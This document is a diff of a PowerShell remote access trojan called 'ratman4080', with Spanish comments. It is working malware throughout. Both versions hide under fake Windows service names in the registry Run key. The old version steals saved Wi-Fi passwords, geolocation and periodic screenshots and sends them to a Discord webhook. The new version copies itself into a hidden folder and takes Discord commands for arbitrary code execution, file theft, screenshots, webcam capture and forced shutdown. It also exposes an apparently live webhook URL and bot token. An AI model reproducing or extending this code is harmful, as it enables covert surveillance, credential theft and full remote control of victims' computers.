@@ -1,101 +1,202 @@
-# ratman4080: integrated reconnaissance daemon with background loop
+# ratman4080: clean persistent daemon with full safe command suite
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$webhookUrl = "https://discord.com/api/webhooks/1545605485489561600/_colAGV1T31y49Q5hpakx8jAAHY5eNwqB3VtGzi0joSFB08omQOm-vMpMsvZykCfPgFp"
+$botToken = "MTU0NTg3MTIxOTIzOTI5MzA5OA.GEgjcj.Ax3_661mvYN2VyNsFOTLhdDDj8pWJlFQti9yV4"
+$channelId = "1545879621537374429"
+$headers = @{ "Authorization" = "Bot $botToken"; "User-Agent" = "DiscordBot" }
 
-# 1. Ensure Persistence in Registry Startup
-$scriptPath = $MyInvocation.MyCommand.Path
-if ($scriptPath) {
-    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $regName = "WindowsUpdateServiceManager"
-    $runCommand = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
-    try {
-        Set-ItemProperty -Path $regPath -Name $regName -Value $runCommand -ErrorAction SilentlyContinue
-    } catch {}
+# --- RUTA Y AUTO-INSTALACIÓN OCULTA ---
+$scriptDir = "$env:APPDATA\Microsoft\Windows\Templates"
+if (!(Test-Path $scriptDir)) { New-Item -ItemType Directory -Force -Path $scriptDir | Out-Null }
+$targetScriptPath = "$scriptDir\svchost_update.ps1"
+
+if (-not (Test-Path $targetScriptPath)) {
+    if ($PSCommandPath) {
+        Copy-Item -Path $PSCommandPath -Destination $targetScriptPath -Force
+    } else {
+        $MyInvocation.MyCommand.Definition | Out-File -FilePath $targetScriptPath -Encoding utf8 -Force
+    }
+    Set-ItemProperty -Path $targetScriptPath -Name Attributes -Value "Hidden, System, ReadOnly"
+}
+
+# --- PERSISTENCIA EN REGISTRO (REGEDIT) CAMUFLADA ---
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$regName = "WindowsServiceHostUpdate"
+$payloadCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetScriptPath`""
+try {
+    Set-ItemProperty -Path $regPath -Name $regName -Value $payloadCmd -ErrorAction Stop
+} catch {}
+
+# --- TELEMETRÍA DE ENCENDIDO (BOOT) ---
+try {
+    $ipInfo = Invoke-RestMethod -Uri "https://ipinfo.io/json" -ErrorAction SilentlyContinue
+    $publicIp = $ipInfo.ip
+    $city = $ipInfo.city
+    $country = $ipInfo.country
+} catch {
+    $publicIp = "Desconocida"
+    $city = ""
+    $country = ""
 }
 
 $user = $env:USERNAME
 $computer = $env:COMPUTERNAME
+$os = (Get-CimInstance Win32_OperatingSystem).Caption
 
-# 2. Recon Execution Function (Runs on start)
-function Send-ReconReport {
-    $privateIp = "No disponible"
-    $gatewayIp = "No disponible"
-    try {
-        $privateIp = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias * -ErrorAction SilentlyContinue | Where-Object { $_.IPAddress -notlike "169.254*" -and $_.IPAddress -notlike "127.*" }).IPAddress | Select-Object -First 1
-        $gatewayIp = (Get-NetRoute -DestinationPrefix "0.0.0.0/0" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty NextHop) | Select-Object -First 1
-    } catch {}
+$msgText = @"
+🟢 **PC ENCENDIDA - svchost daemon activo**
+👤 Usuario: $user
+💻 Equipo: $computer
+🌐 IP: $publicIp ($city, $country)
+🪟 OS: $os
+"@
 
-    $geoData = $null
-    try {
-        $geoData = Invoke-RestMethod -Uri "http://ip-api.com/json/?fields=status,country,city,isp,query,lat,lon" -UseBasicParsing
-    } catch {}
+$bodyBytes = [System.Text.Encoding]::UTF8.GetBytes((@{ content = $msgText } | ConvertTo-Json -Compress))
+Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$channelId/messages" -Headers $headers -Method Post -Body $bodyBytes -ContentType "application/json; charset=utf-8" -ErrorAction SilentlyContinue
 
-    $publicIp = if ($geoData -and $geoData.status -eq "success") { $geoData.query } else { "No disponible" }
-    $country = if ($geoData -and $geoData.status -eq "success") { $geoData.country } else { "No disponible" }
-    $city = if ($geoData -and $geoData.status -eq "success") { $geoData.city } else { "No disponible" }
-    $isp = if ($geoData -and $geoData.status -eq "success") { $geoData.isp } else { "No disponible" }
-    $lat = if ($geoData -and $geoData.status -eq "success") { $geoData.lat } else { "" }
-    $lon = if ($geoData -and $geoData.status -eq "success") { $geoData.lon } else { "" }
-    $mapsLink = if ($lat -and $lon) { "https://www.google.com/maps/search/?api=1&query=$lat,$lon" } else { "No disponible" }
-
-    $wifiData = "No disponible"
-    try {
-        $wifiRaw = netsh wlan show profiles
-        $profiles = ($wifiRaw | Select-String "Perfil de todos los usuarios\s*:\s*(.*)").Matches.Groups[1].Value.Trim()
-        if (-not $profiles) { $profiles = ($wifiRaw | Select-String "All User Profile\s*:\s*(.*)").Matches.Groups[1].Value.Trim() }
-        
-        $wifiResults = foreach ($p in $profiles) {
-            $passRaw = netsh wlan show profile name="$p" key=clear
-            $pass = ($passRaw | Select-String "Contenido de la clave\s*:\s*(.*)").Matches.Groups[1].Value.Trim()
-            if (-not $pass) { $pass = ($passRaw | Select-String "Key Content\s*:\s*(.*)").Matches.Groups[1].Value.Trim() }
-            if (-not $pass) { $pass = "Sin contraseña" }
-            "$p -> $pass"
-        }
-        if ($wifiResults) { $wifiData = $wifiResults -join " | " }
-    } catch {
-        $wifiData = "Error al extraer Wi-Fi"
+# --- NOTIFICACIÓN DE APAGADO (SHUTDOWN TRAP) ---
+$global:shutdownNotified = $false
+Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action {
+    if (-not $global:shutdownNotified) {
+        $global:shutdownNotified = $true
+        $offMsg = @{ content = "🔴 **PC APAGÁNDOSE**`n👤 Usuario: $env:USERNAME`n💻 Equipo: $env:COMPUTERNAME" } | ConvertTo-Json -Compress
+        Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/1545879621537374429/messages" -Headers @{ "Authorization" = "Bot MTU0NTg3MTIxOTIzOTI5MzA5OA.GEgjcj.Ax3_661mvYN2VyNsFOTLhdDDj8pWJlFQti9yV4"; "User-Agent" = "DiscordBot" } -Method Post -Body $offMsg -ContentType "application/json; charset=utf-8" -ErrorAction SilentlyContinue
     }
+} | Out-Null
 
-    $report = "=== REPORTE DE RED Y UBICACIÓN ===" + "`n" +
-              "PC: $computer | Usuario: $user" + "`n" +
-              "IP Privada: $privateIp | Gateway: $gatewayIp" + "`n" +
-              "IP Pública: $publicIp ($country, $city) - ISP: $isp" + "`n" +
-              "Google Maps: $mapsLink" + "`n`n" +
-              "--- Wi-Fi y Claves ---`n$wifiData"
+$lastProcessedId = $null
 
-    if ($report.Length -gt 1950) {
-        $report = $report.Substring(0, 1950) + "`n[... Recortado ...]"
-    }
-
-    $body = @{ content = $report } | ConvertTo-Json
-    try {
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json; charset=utf-8" -ErrorAction SilentlyContinue
-    } catch {}
-}
-
-# Run the text reconnaissance report once on launch
-Send-ReconReport
-
-Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
-
-# 3. Infinite Background Loop (Screenshot every 5 minutes)
+# --- BUCLE DE ESCUCHA DE COMANDOS ---
 while ($true) {
-    $screenshotPath = "$env:TEMP\snap_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
     try {
-        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
-        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
-        $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
-        $graphics.Dispose()
-        $bitmap.Dispose()
+        $messages = Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$channelId/messages?limit=5" -Headers $headers -Method Get -ErrorAction SilentlyContinue
+        if ($messages) {
+            $sortedMessages = $messages | Sort-Object { [int64]$_.id }
+            foreach ($msg in $sortedMessages) {
+                $msgId = $msg.id
+                $content = $msg.content.Trim()
+                $contentLower = $content.ToLower()
 
-        if (Test-Path $screenshotPath) {
-            & curl.exe -s -F "file=@$screenshotPath" "$webhookUrl" > $null
-            Remove-Item $screenshotPath -Force -ErrorAction SilentlyContinue
+                if ($msgId -ne $lastProcessedId) {
+                    $lastProcessedId = $msgId
+
+                    if ($contentLower.StartsWith("exec ")) {
+                        $cmdToRun = $content.Substring(5)
+                        try {
+                            $output = Invoke-Expression $cmdToRun 2>&1 | Out-String
+                            if ([string]::IsNullOrWhiteSpace($output)) { $output = "[Comando ejecutado sin salida]" }
+                            if ($output.Length -gt 1900) { $output = $output.Substring(0, 1900) }
+                            $execPayload = @{ content = "💻 **EXEC Output:**`n````n$output`n```" } | ConvertTo-Json -Compress
+                            Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$channelId/messages" -Headers $headers -Method Post -Body $execPayload -ContentType "application/json; charset=utf-8" -ErrorAction SilentlyContinue
+                        } catch {
+                            $errText = $_.Exception.Message
+                            $errPayload = @{ content = "❌ Error al ejecutar: $errText" } | ConvertTo-Json -Compress
+                            Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$channelId/messages" -Headers $headers -Method Post -Body $errPayload -ContentType "application/json; charset=utf-8" -ErrorAction SilentlyContinue
+                        }
+                    }
+                    elseif ($contentLower.StartsWith("download ")) {
+                        $filePath = $content.Substring(9).Trim()
+                        if (Test-Path $filePath) {
+                            try {
+                                & curl.exe -s -H "Authorization: Bot $botToken" -F "file=@$filePath" "https://discord.com/api/v10/channels/$channelId/messages" > $null
+                            } catch {}
+                        } else {
+                            $notFoundPayload = @{ content = "❌ El archivo no existe: $filePath" } | ConvertTo-Json -Compress
+                            Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$channelId/messages" -Headers $headers -Method Post -Body $notFoundPayload -ContentType "application/json; charset=utf-8" -ErrorAction SilentlyContinue
+                        }
+                    }
+                    elseif ($contentLower.StartsWith("tts ")) {
+                        $phrase = $content.Substring(4)
+                        try {
+                            Add-Type -AssemblyName System.Speech
+                            $synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
+                            $synth.Speak($phrase)
+                            $ttsPayload = @{ content = "🔊 TTS reproducido con éxito." } | ConvertTo-Json -Compress
+                            Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$channelId/messages" -Headers $headers -Method Post -Body $ttsPayload -ContentType "application/json; charset=utf-8" -ErrorAction SilentlyContinue
+                        } catch {}
+                    }
+                    elseif ($contentLower -eq "processes") {
+                        try {
+                            $pList = Get-Process | Select-Object Name, Id | Select-Object -First 25 | Format-Table -AutoSize | Out-String
+                            if ($pList.Length -gt 1900) { $pList = $pList.Substring(0, 1900) }
+                            $procPayload = @{ content = "📊 **Procesos activos:**`n````n$pList`n```" } | ConvertTo-Json -Compress
+                            Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$channelId/messages" -Headers $headers -Method Post -Body $procPayload -ContentType "application/json; charset=utf-8" -ErrorAction SilentlyContinue
+                        } catch {}
+                    }
+                    elseif ($contentLower.StartsWith("kill ")) {
+                        $targetProc = $content.Substring(5).Trim()
+                        try {
+                            Stop-Process -Name $targetProc -Force -ErrorAction Stop
+                            $killPayload = @{ content = "💀 Proceso '$targetProc' finalizado." } | ConvertTo-Json -Compress
+                            Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$channelId/messages" -Headers $headers -Method Post -Body $killPayload -ContentType "application/json; charset=utf-8" -ErrorAction SilentlyContinue
+                        } catch {}
+                    }
+                    elseif ($contentLower -eq "screenshot") {
+                        $screenshotPath = "$env:TEMP\snap_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
+                        try {
+                            Add-Type -AssemblyName System.Windows.Forms
+                            Add-Type -AssemblyName System.Drawing
+                            $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+                            $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
+                            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+                            $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
+                            $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
+                            $graphics.Dispose()
+                            $bitmap.Dispose()
+
+                            if (Test-Path $screenshotPath) {
+                                & curl.exe -s -H "Authorization: Bot $botToken" -F "file=@$screenshotPath" "https://discord.com/api/v10/channels/$channelId/messages" > $null
+                                Remove-Item $screenshotPath -Force -ErrorAction SilentlyContinue
+                            }
+                        } catch {}
+                    }
+                    elseif ($contentLower -eq "webcam") {
+                        $camPath = "$env:TEMP\cam_$(Get-Date -Format 'yyyyMMdd_HHmmss').jpg"
+                        try {
+                            $psi = New-Object System.Diagnostics.ProcessStartInfo
+                            $psi.FileName = "microsoft.windows.camera:"
+                            $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Minimized
+                            $proc = [System.Diagnostics.Process]::Start($psi)
+
+                            Start-Sleep -Seconds 1.5
+                            Add-Type -AssemblyName System.Windows.Forms
+                            Add-Type -AssemblyName System.Drawing
+                            $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+                            $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
+                            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+                            $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
+                            $bitmap.Save($camPath, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+                            $graphics.Dispose()
+                            $bitmap.Dispose()
+
+                            Stop-Process -Name "WindowsCamera" -Force -ErrorAction SilentlyContinue
+
+                            if (Test-Path $camPath) {
+                                & curl.exe -s -H "Authorization: Bot $botToken" -F "file=@$camPath" "https://discord.com/api/v10/channels/$channelId/messages" > $null
+                                Remove-Item $camPath -Force -ErrorAction SilentlyContinue
+                            }
+                        } catch {
+                            Stop-Process -Name "WindowsCamera" -Force -ErrorAction SilentlyContinue
+                        }
+                    }
+                    elseif ($contentLower -eq "lock") {
+                        rundll32.exe user32.dll,LockWorkStation
+                    }
+                    elseif ($contentLower -eq "restart") {
+                        Restart-Computer -Force -ErrorAction SilentlyContinue
+                    }
+                    elseif ($contentLower -eq "shutdown") {
+                        Stop-Computer -Force -ErrorAction SilentlyContinue
+                    }
+                    elseif ($contentLower -eq "closewindow") {
+                        $activeWindow = (Get-Process | Where-Object { $_.MainWindowTitle } | Select-Object -First 1)
+                        if ($activeWindow) {
+                            Stop-Process -Id $activeWindow.Id -Force -ErrorAction SilentlyContinue
+                        }
+                    }
+                }
+            }
         }
     } catch {}
 
-    Start-Sleep -Seconds 300
+    Start-Sleep -Seconds 5
 }
